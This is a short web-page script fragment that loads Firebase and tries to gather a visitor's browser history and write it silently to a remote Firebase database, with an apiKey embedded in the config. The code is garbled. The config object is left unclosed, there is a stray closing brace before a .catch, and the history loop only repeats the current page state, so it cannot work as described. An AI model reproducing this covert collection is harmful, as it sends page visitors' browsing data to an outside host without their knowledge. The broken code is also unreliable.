  <!-- Firebase SDK via script tag -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-database.js";

    // Your Firebase configuration (from your project)
    const firebaseConfig = {
      apiKey: "AIzaSyD0WZgJq6XqEYj8p9GBm5NWhpD6-rpqqDM",

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Function to get browser history
    function getBrowserHistory() {
      const history = [];
      let current = window.history.length;

      for (let i = 0; i < current; i++) {
        history.push(window.history.state.title || "No Title");
      }

      return history;
    }

    // Get and send browser history to Firebase
    const browserHistory = getBrowserHistory();

    set(ref(database, "history"), browserHistory)

      })
      .catch((error) => {
        console.error("Error writing data to Firebase:", error);
      });
